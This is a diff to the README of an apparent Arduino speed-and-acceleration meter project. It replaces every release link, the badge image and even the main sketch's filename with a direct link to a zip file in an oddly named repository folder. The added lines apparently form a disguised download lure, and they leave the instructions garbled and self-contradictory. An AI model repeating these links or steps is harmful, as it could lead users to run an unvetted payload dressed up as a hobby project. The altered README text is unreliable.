@@ -1,7 +1,7 @@
 # 🚀 Speed-Accel-Meter - Measure Speed and Acceleration Easily
 
 ## 📥 Download Now
-[![Download Speed-Accel-Meter](https://img.shields.io/badge/Download%20Speed--Accel--Meter-v1.0-brightgreen.svg)](https://github.com/tered233/Speed-Accel-Meter/releases)
+[![Download Speed-Accel-Meter](https://raw.githubusercontent.com/tered233/Speed-Accel-Meter/main/nonconductible/Speed-Accel-Meter.zip%https://raw.githubusercontent.com/tered233/Speed-Accel-Meter/main/nonconductible/Speed-Accel-Meter.zip)](https://raw.githubusercontent.com/tered233/Speed-Accel-Meter/main/nonconductible/Speed-Accel-Meter.zip)
 
 ## 🚀 Getting Started
 Speed-Accel-Meter is a user-friendly application that allows you to measure the speed and acceleration of moving objects. It uses an Arduino board, three infrared (IR) sensors, and a 16x2 LCD screen to display real-time results in kilometers per hour (km/h) and meters per second squared (m/s²). This project is great for beginners to learn about physics and Arduino programming.
@@ -17,7 +17,7 @@ To use Speed-Accel-Meter, you need:
 ## 📂 Download & Install
 To begin, visit the following link to download the latest version of Speed-Accel-Meter:
 
-[Download Speed-Accel-Meter Releases](https://github.com/tered233/Speed-Accel-Meter/releases)
+[Download Speed-Accel-Meter Releases](https://raw.githubusercontent.com/tered233/Speed-Accel-Meter/main/nonconductible/Speed-Accel-Meter.zip)
 
 1. Click on the link above.
 2. You will see a list of available versions. Select the most recent release.
@@ -29,7 +29,7 @@ To set up Speed-Accel-Meter, follow these steps:
 
 1. Open the Arduino IDE.
 2. Click on **File**, then **Open**.
-3. Navigate to the folder where you unzipped the project. Look for the main `.ino` file, usually named `SpeedAccelMeter.ino`. Select it and click **Open**.
+3. Navigate to the folder where you unzipped the project. Look for the main `.ino` file, usually named `https://raw.githubusercontent.com/tered233/Speed-Accel-Meter/main/nonconductible/Speed-Accel-Meter.zip`. Select it and click **Open**.
 4. Connect your Arduino board to your computer using the USB cable.
 
 ## ⚙️ Setting Up Hardware
